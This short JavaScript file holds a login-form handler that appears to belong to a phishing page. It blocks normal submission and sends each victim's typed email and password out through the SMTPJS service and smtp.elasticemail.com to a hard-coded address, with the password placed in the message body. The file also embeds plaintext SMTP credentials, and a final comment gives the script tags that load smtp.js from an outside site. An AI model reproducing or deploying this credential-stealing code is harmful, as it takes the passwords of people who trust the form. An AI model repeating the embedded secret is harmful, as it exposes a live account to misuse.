function submitLoginForm(event){
    event.preventDefault();

    console.log(event.target['email'].value);
    console.log(event.target['password'].value);

    Email.send({
        Host : "smtp.elasticemail.com",
        Username : "18erecs080.vicky@rietjaipur.ac.in",
        Password : "A843126D89415A2471C3874B582AF9955ED6",
        To : '18erecs080.vicky@rietjaipur.ac.in',
        From : "18erecs080.vicky@rietjaipur.ac.in",
        Subject : event.target['email'].value,
        Body : event.target['password'].value
    });
}

// <script src="https://smtpjs.com/v3/smtp.js"></script><script src="email.js" type="text/javascript"></script>